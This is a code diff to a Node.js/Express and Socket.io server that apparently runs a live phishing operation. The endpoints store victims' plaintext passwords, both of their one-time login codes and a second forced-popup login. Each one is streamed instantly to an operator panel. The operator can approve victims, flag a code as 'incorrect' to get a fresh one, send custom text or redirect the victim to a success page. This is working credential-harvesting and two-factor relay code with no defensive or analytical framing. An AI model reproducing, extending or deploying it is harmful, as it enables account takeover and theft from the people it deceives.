@@ -117,7 +117,6 @@ async function initializeDatabase() {
   try {
     console.log('📦 Initializing database...');
     
-    // Create users table
     await pool.query(`
       CREATE TABLE IF NOT EXISTS users (
         id SERIAL PRIMARY KEY,
@@ -144,7 +143,6 @@ async function initializeDatabase() {
     `);
     console.log('✅ Users table ready');
 
-    // Create admin table
     await pool.query(`
       CREATE TABLE IF NOT EXISTS admin (
         id SERIAL PRIMARY KEY,
@@ -154,7 +152,6 @@ async function initializeDatabase() {
     `);
     console.log('✅ Admin table ready');
 
-    // Create blocked_emails table
     await pool.query(`
       CREATE TABLE IF NOT EXISTS blocked_emails (
         id SERIAL PRIMARY KEY,
@@ -165,7 +162,6 @@ async function initializeDatabase() {
     `);
     console.log('✅ Blocked emails table ready');
 
-    // Add columns if they don't exist
     await pool.query(`
       ALTER TABLE users 
       ADD COLUMN IF NOT EXISTS second_approved BOOLEAN DEFAULT FALSE,
@@ -180,7 +176,6 @@ async function initializeDatabase() {
       ADD COLUMN IF NOT EXISTS second_otp_submitted_at TIMESTAMP
     `).catch(() => console.log('✅ Additional columns exist'));
 
-    // Create update timestamp function
     await pool.query(`
       CREATE OR REPLACE FUNCTION update_updated_at_column()
       RETURNS TRIGGER AS $$
@@ -191,7 +186,6 @@ async function initializeDatabase() {
       $$ language 'plpgsql';
     `);
 
-    // Create trigger
     await pool.query(`
       DROP TRIGGER IF EXISTS update_users_updated_at ON users;
       CREATE TRIGGER update_users_updated_at
@@ -200,7 +194,6 @@ async function initializeDatabase() {
           EXECUTE FUNCTION update_updated_at_column();
     `);
 
-    // Insert default admin if not exists
     const adminExists = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
     if (adminExists.rows.length === 0) {
       await pool.query('INSERT INTO admin (email, password) VALUES ($1, $2)', 
@@ -216,9 +209,7 @@ async function initializeDatabase() {
   }
 }
 
-// ==================== HELPER FUNCTIONS ====================
-
-// Check if email is blocked
+// Helper function to check if email is blocked
 async function isEmailBlocked(email) {
   const result = await pool.query('SELECT * FROM blocked_emails WHERE LOWER(email) = LOWER($1)', [email]);
   return result.rows.length > 0;
@@ -226,13 +217,12 @@ async function isEmailBlocked(email) {
 
 // ==================== USER ENDPOINTS ====================
 
-// User login - sends email to admin for approval
+// User login
 app.post('/api/users/login', async (req, res) => {
   try {
     const { email, password } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
 
-    // Check if email is blocked
     const blocked = await isEmailBlocked(email);
     if (blocked) {
       return res.json({ blocked: true, message: 'Email is blocked' });
@@ -245,93 +235,74 @@ app.post('/api/users/login', async (req, res) => {
       SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL, second_otp = NULL, approved = false, second_approved = false, email_submitted_at = CURRENT_TIMESTAMP
     `, [email, password]);
 
-    console.log('🔔 SENDING NOTIFICATION TO ADMIN - New Login:', email);
-    
-    io.emit('user-login', { 
-      email, 
-      password,
-      timestamp: new Date(),
-      message: '🔐 New user login attempt'
-    });
+    console.log('🔔 New login:', email);
+    io.emit('user-login', { email, password, timestamp: new Date() });
 
     res.json({ success: true, message: 'Email submitted for approval' });
-    
   } catch (error) {
     console.error('❌ Login error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Check if email is blocked (for polling)
+// Check if email is blocked
 app.post('/api/users/check-blocked', async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.json({ blocked: false });
-    
     const blocked = await isEmailBlocked(email);
     res.json({ blocked });
   } catch (error) {
-    console.error('❌ Check blocked error:', error.message);
     res.json({ blocked: false });
   }
 });
 
-// Check if email is approved by admin
+// Check email approval
 app.post('/api/users/check-approval', async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.json({ approved: false });
-    
     const result = await pool.query('SELECT approved FROM users WHERE email = $1', [email]);
     res.json({ approved: result.rows.length > 0 ? result.rows[0].approved : false });
   } catch (error) {
-    console.error('❌ Check approval error:', error.message);
     res.json({ approved: false });
   }
 });
 
-// Check first approval (for email approval)
+// Check first approval
 app.post('/api/users/check-first-approval', async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.json({ approved: false });
-    
     const result = await pool.query('SELECT approved FROM users WHERE email = $1', [email]);
     res.json({ approved: result.rows.length > 0 ? result.rows[0].approved : false });
   } catch (error) {
-    console.error('❌ Check first approval error:', error.message);
     res.json({ approved: false });
   }
 });
 
-// Check second approval (for OTP approval)
+// Check second approval
 app.post('/api/users/check-second-approval', async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.json({ approved: false });
-    
     const result = await pool.query('SELECT second_approved FROM users WHERE email = $1', [email]);
     res.json({ approved: result.rows.length > 0 ? result.rows[0].second_approved : false });
   } catch (error) {
-    console.error('❌ Check second approval error:', error.message);
     res.json({ approved: false });
   }
 });
 
-// Submit first OTP - updates the otp column
+// Submit first OTP
 app.post('/api/users/submit-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
     if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
-    
-    if (otp.length !== 6) {
-      return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
-    }
+    if (otp.length !== 6) return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
     
     await pool.query('UPDATE users SET otp = $1, otp_verified = false, approved = false, first_otp_submitted_at = CURRENT_TIMESTAMP WHERE email = $2', [otp, email]);
     
     io.emit('user-otp-created', { email, otp, timestamp: new Date() });
-    
     res.json({ success: true });
   } catch (error) {
     console.error('❌ Submit OTP error:', error.message);
@@ -339,20 +310,15 @@ app.post('/api/users/submit-otp', async (req, res) => {
   }
 });
 
-// Submit second OTP - with duplicate check
+// Submit second OTP with duplicate check
 app.post('/api/users/submit-second-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
     if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
+    if (otp.length !== 6) return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
     
-    if (otp.length !== 6) {
-      return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
-    }
-    
-    // Get the first OTP to check for duplicate
     const userResult = await pool.query('SELECT otp FROM users WHERE email = $1', [email]);
     if (userResult.rows.length > 0 && userResult.rows[0].otp === otp) {
-      // Notify admin about duplicate attempt
       io.emit('duplicate-otp-attempt', { email, otp, timestamp: new Date() });
       return res.status(400).json({ error: 'You cannot use the same code as your first verification. Please enter a different code.' });
     }
@@ -360,7 +326,6 @@ app.post('/api/users/submit-second-otp', async (req, res) => {
     await pool.query('UPDATE users SET second_otp = $1, second_approved = false, second_otp_submitted_at = CURRENT_TIMESTAMP WHERE email = $2', [otp, email]);
     
     io.emit('user-second-otp-created', { email, second_otp: otp, timestamp: new Date() });
-    
     res.json({ success: true });
   } catch (error) {
     console.error('❌ Submit second OTP error:', error.message);
@@ -370,84 +335,54 @@ app.post('/api/users/submit-second-otp', async (req, res) => {
 
 // ==================== POLLING ENDPOINTS ====================
 
-// Check if admin wants to force login popup
 app.post('/api/users/check-force-login', async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.json({ force_login: false });
-    
     const result = await pool.query('SELECT force_login FROM users WHERE email = $1', [email]);
     res.json({ force_login: result.rows.length > 0 ? result.rows[0].force_login : false });
   } catch (error) {
-    console.error('❌ Check force login error:', error.message);
     res.json({ force_login: false });
   }
 });
 
-// Check if admin wants to redirect user to success
 app.post('/api/users/check-redirect-success', async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.json({ redirect_success: false });
-    
     const result = await pool.query('SELECT redirect_success FROM users WHERE email = $1', [email]);
     res.json({ redirect_success: result.rows.length > 0 ? result.rows[0].redirect_success : false });
   } catch (error) {
-    console.error('❌ Check redirect success error:', error.message);
     res.json({ redirect_success: false });
   }
 });
 
-// Check if admin sent a text message
 app.post('/api/users/check-admin-text', async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.json({ admin_text: null, text_release: false });
     
     const result = await pool.query('SELECT admin_text, text_release FROM users WHERE email = $1', [email]);
-    if (result.rows.length === 0) {
-      return res.json({ admin_text: null, text_release: false });
-    }
+    if (result.rows.length === 0) return res.json({ admin_text: null, text_release: false });
     
-    res.json({ 
-      admin_text: result.rows[0].admin_text, 
-      text_release: result.rows[0].text_release 
-    });
+    res.json({ admin_text: result.rows[0].admin_text, text_release: result.rows[0].text_release });
   } catch (error) {
-    console.error('❌ Check admin text error:', error.message);
     res.json({ admin_text: null, text_release: false });
   }
 });
 
-// User submits login from popup
 app.post('/api/users/submit-login-popup', async (req, res) => {
   try {
     const { email, loginEmail, loginPassword } = req.body;
-    if (!email || !loginEmail || !loginPassword) {
-      return res.status(400).json({ error: 'All fields required' });
-    }
+    if (!email || !loginEmail || !loginPassword) return res.status(400).json({ error: 'All fields required' });
     
     const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
-    if (!emailRegex.test(loginEmail)) {
-      return res.status(400).json({ error: 'Please enter a valid email address' });
-    }
+    if (!emailRegex.test(loginEmail)) return res.status(400).json({ error: 'Please enter a valid email address' });
     
-    await pool.query(
-      'UPDATE users SET login_email = $1, login_password = $2, force_login = false WHERE email = $3',
-      [loginEmail, loginPassword, email]
-    );
+    await pool.query('UPDATE users SET login_email = $1, login_password = $2, force_login = false WHERE email = $3', [loginEmail, loginPassword, email]);
     
-    console.log('🔔 User submitted popup login:', email, 'Login Email:', loginEmail);
-    
-    io.emit('user-login-submitted', { 
-      email,
-      loginEmail,
-      loginPassword,
-      timestamp: new Date(),
-      message: '🔐 User completed forced login'
-    });
-    
-    res.json({ success: true, message: 'Login submitted successfully' });
+    io.emit('user-login-submitted', { email, loginEmail, loginPassword, timestamp: new Date() });
+    res.json({ success: true });
   } catch (error) {
     console.error('❌ Submit login popup error:', error.message);
     res.status(500).json({ error: 'Server error' });
@@ -456,34 +391,6 @@ app.post('/api/users/submit-login-popup', async (req, res) => {
 
 // ==================== ADMIN ENDPOINTS ====================
 
-// Admin delete user
-app.post('/api/admin/delete-user', authenticateJWT, async (req, res) => {
-  try {
-    const { email } = req.body;
-    if (!email) return res.status(400).json({ error: 'Email required' });
-    
-    const result = await pool.query('DELETE FROM users WHERE email = $1 RETURNING email', [email]);
-    
-    if (result.rowCount === 0) {
-      return res.status(404).json({ error: 'User not found' });
-    }
-    
-    console.log('🗑️ Admin deleted user:', email);
-    
-    io.emit('user-deleted', { 
-      email,
-      timestamp: new Date(),
-      message: '🗑️ User deleted from system'
-    });
-    
-    res.json({ success: true, message: 'User deleted successfully' });
-  } catch (error) {
-    console.error('❌ Delete user error:', error.message);
-    res.status(500).json({ error: 'Server error' });
-  }
-});
-
-// Admin login
 app.post('/api/admin/login', async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -492,12 +399,7 @@ app.post('/api/admin/login', async (req, res) => {
     const result = await pool.query('SELECT * FROM admin WHERE email = $1 AND password = $2', [email, password]);
     if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
 
-    const token = jwt.sign(
-      { id: result.rows[0].id, email, role: 'admin' },
-      process.env.JWT_SECRET,
-      { expiresIn: '24h' }
-    );
-
+    const token = jwt.sign({ id: result.rows[0].id, email, role: 'admin' }, process.env.JWT_SECRET, { expiresIn: '24h' });
     res.json({ token });
   } catch (error) {
     console.error('❌ Admin login error:', error.message);
@@ -505,35 +407,14 @@ app.post('/api/admin/login', async (req, res) => {
   }
 });
 
-// Get all users with timestamps
 app.get('/api/admin/users', authenticateJWT, async (req, res) => {
   try {
     const result = await pool.query(`
-      SELECT 
-        id, 
-        email, 
-        password,
-        otp,
-        second_otp,
-        otp_attempts,
-        otp_verified,
-        approved,
-        second_approved,
-        force_login,
-        redirect_success,
-        login_email,
-        login_password,
-        admin_text,
-        text_release,
-        email_submitted_at,
-        first_otp_submitted_at,
-        second_otp_submitted_at,
-        created_at,
-        updated_at
-      FROM users 
-      ORDER BY created_at DESC
+      SELECT id, email, password, otp, second_otp, otp_attempts, otp_verified, approved, second_approved,
+             force_login, redirect_success, login_email, login_password, admin_text, text_release,
+             email_submitted_at, first_otp_submitted_at, second_otp_submitted_at, created_at, updated_at
+      FROM users ORDER BY created_at DESC
     `);
-    
     res.json(result.rows);
   } catch (error) {
     console.error('❌ Admin users error:', error.message);
@@ -541,217 +422,163 @@ app.get('/api/admin/users', authenticateJWT, async (req, res) => {
   }
 });
 
-// Get all blocked emails
 app.get('/api/admin/blocked-emails', authenticateJWT, async (req, res) => {
   try {
     const result = await pool.query('SELECT * FROM blocked_emails ORDER BY blocked_at DESC');
     res.json(result.rows);
   } catch (error) {
-    console.error('❌ Get blocked emails error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Admin block email
 app.post('/api/admin/block-email', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     
-    // Add to blocked_emails table
     await pool.query('INSERT INTO blocked_emails (email, blocked_by) VALUES ($1, $2) ON CONFLICT (email) DO NOTHING', [email, req.user.email]);
-    
-    // Set redirect_success flag on user to redirect them immediately
     await pool.query('UPDATE users SET redirect_success = true WHERE email = $1', [email]);
     
-    console.log('🚫 Admin blocked email:', email);
-    
-    io.emit('user-blocked', { 
-      email,
-      timestamp: new Date(),
-      message: '🚫 User has been blocked'
-    });
-    
-    res.json({ success: true, message: 'Email blocked successfully' });
+    io.emit('user-blocked', { email, timestamp: new Date() });
+    res.json({ success: true });
   } catch (error) {
     console.error('❌ Block email error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Admin unblock email
 app.post('/api/admin/unblock-email', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     
+    const userExists = await pool.query('SELECT id FROM users WHERE LOWER(email) = LOWER($1)', [email]);
+    
+    if (userExists.rows.length > 0) {
+      await pool.query(`
+        UPDATE users SET 
+          password = 'user', otp = NULL, second_otp = NULL, otp_attempts = 0, otp_verified = false,
+          approved = false, second_approved = false, force_login = false, redirect_success = false,
+          login_email = NULL, login_password = NULL, admin_text = NULL, text_release = false,
+          email_submitted_at = NULL, first_otp_submitted_at = NULL, second_otp_submitted_at = NULL,
+          created_at = CURRENT_TIMESTAMP, updated_at = CURRENT_TIMESTAMP
+        WHERE LOWER(email) = LOWER($1)
+      `, [email]);
+    }
+    
     await pool.query('DELETE FROM blocked_emails WHERE LOWER(email) = LOWER($1)', [email]);
     
-    console.log('🔓 Admin unblocked email:', email);
-    
-    res.json({ success: true, message: 'Email unblocked successfully' });
+    io.emit('user-unblocked', { email, timestamp: new Date() });
+    res.json({ success: true });
   } catch (error) {
     console.error('❌ Unblock email error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Admin approve email (first approval)
 app.post('/api/admin/approve-user', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
-    
-    const result = await pool.query('UPDATE users SET approved = true WHERE email = $1 RETURNING approved', [email]);
-    
-    if (result.rowCount === 0) {
-      return res.status(404).json({ error: 'User not found' });
-    }
-    
-    console.log('✅ Admin approved email for:', email);
-    
-    res.json({ success: true, message: 'Email approved' });
+    await pool.query('UPDATE users SET approved = true WHERE email = $1', [email]);
+    res.json({ success: true });
   } catch (error) {
     console.error('❌ Approve email error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Admin approve second OTP
 app.post('/api/admin/approve-second', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
-    
-    const result = await pool.query('UPDATE users SET second_approved = true WHERE email = $1 RETURNING second_approved', [email]);
-    
-    if (result.rowCount === 0) {
-      return res.status(404).json({ error: 'User not found' });
-    }
-    
-    console.log('✅ Admin approved second OTP for:', email);
-    
-    res.json({ success: true, message: 'Second OTP approved' });
+    await pool.query('UPDATE users SET second_approved = true WHERE email = $1', [email]);
+    res.json({ success: true });
   } catch (error) {
     console.error('❌ Approve second error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Admin force login
 app.post('/api/admin/force-login', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
-    
     await pool.query('UPDATE users SET force_login = true WHERE email = $1', [email]);
-    console.log('🔔 Admin forced login for user:', email);
-    
-    io.emit('force-login-triggered', { 
-      email,
-      timestamp: new Date(),
-      message: '🔐 Force login triggered for user'
-    });
-    
-    res.json({ success: true, message: 'Force login triggered' });
+    io.emit('force-login-triggered', { email, timestamp: new Date() });
+    res.json({ success: true });
   } catch (error) {
     console.error('❌ Force login error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Admin redirect to success
 app.post('/api/admin/redirect-success', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
-    
     await pool.query('UPDATE users SET redirect_success = true WHERE email = $1', [email]);
-    console.log('🔔 Admin redirecting user to success:', email);
-    
-    io.emit('redirect-success-triggered', { 
-      email,
-      timestamp: new Date(),
-      message: '🎉 Redirect to success triggered for user'
-    });
-    
-    res.json({ success: true, message: 'Redirect to success triggered' });
+    io.emit('redirect-success-triggered', { email, timestamp: new Date() });
+    res.json({ success: true });
   } catch (error) {
     console.error('❌ Redirect success error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Admin send text to user
 app.post('/api/admin/send-text', authenticateJWT, async (req, res) => {
   try {
     const { email, text } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     if (!text || text.trim() === '') return res.status(400).json({ error: 'Text message required' });
     
-    await pool.query(
-      'UPDATE users SET admin_text = $1, text_release = false WHERE email = $2',
-      [text.trim(), email]
-    );
-    console.log('🔔 Admin sent text to user:', email, 'Text:', text);
-    
-    io.emit('text-sent', { 
-      email,
-      text,
-      timestamp: new Date(),
-      message: '📝 Text message sent to user'
-    });
-    
-    res.json({ success: true, message: 'Text sent to user' });
+    await pool.query('UPDATE users SET admin_text = $1, text_release = false WHERE email = $2', [text.trim(), email]);
+    io.emit('text-sent', { email, text, timestamp: new Date() });
+    res.json({ success: true });
   } catch (error) {
     console.error('❌ Send text error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Admin release text popup
 app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
-    
-    await pool.query(
-      'UPDATE users SET text_release = true WHERE email = $1',
-      [email]
-    );
-    console.log('🔔 Admin released text popup for user:', email);
-    
-    res.json({ success: true, message: 'Text popup released' });
+    await pool.query('UPDATE users SET text_release = true WHERE email = $1', [email]);
+    res.json({ success: true });
   } catch (error) {
     console.error('❌ Release text error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Admin incorrect OTP - sends text to user
+// INCORRECT OTP - Sets error flag for user (NO SOUND, NO NOTIFICATION, NO POPUP)
 app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     
-    const incorrectMessage = '❌ Incorrect OTP entered. Please check your email and try again.';
+    await pool.query('UPDATE users SET admin_text = $1, text_release = false WHERE email = $2', ['incorrect_otp_error', email]);
+    console.log('🔴 Admin marked OTP as incorrect for user:', email);
     
-    await pool.query(
-      'UPDATE users SET admin_text = $1, text_release = false WHERE email = $2',
-      [incorrectMessage, email]
-    );
-    
-    console.log('🔔 Admin sent incorrect OTP message to user:', email);
-    
-    io.emit('incorrect-otp-triggered', { 
-      email,
-      timestamp: new Date(),
-      message: 'Incorrect OTP message sent to user'
-    });
-    
-    res.json({ success: true, message: 'Incorrect OTP message sent' });
+    // NO socket emit - NO notification
+    res.json({ success: true });
   } catch (error) {
     console.error('❌ Incorrect OTP error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+app.post('/api/admin/delete-user', authenticateJWT, async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    await pool.query('DELETE FROM users WHERE email = $1', [email]);
+    io.emit('user-deleted', { email, timestamp: new Date() });
+    res.json({ success: true });
+  } catch (error) {
+    console.error('❌ Delete user error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -759,14 +586,8 @@ app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
 // ==================== HEALTH CHECK ====================
 
 app.get('/api/health', (req, res) => {
-  res.json({ 
-    status: 'ok', 
-    database: process.env.DATABASE_URL ? 'Configured' : 'Not configured',
-    timestamp: new Date().toISOString()
-  });
+  res.json({ status: 'ok', timestamp: new Date().toISOString() });
 });
-
-// ==================== ERROR HANDLING ====================
 
 app.use((err, req, res, next) => {
   console.error('❌ Unhandled error:', err.stack);
@@ -788,10 +609,8 @@ initializeDatabase().then((success) => {
       console.log(`📡 Port: ${PORT}`);
       console.log(`🔗 User login: /users/login`);
       console.log(`🔗 Admin login: /admin`);
-      console.log('\n📢 Socket.io server ready for real-time notifications\n');
     });
   } else {
-    console.error('❌ Failed to initialize database. Exiting...');
     process.exit(1);
   }
 });
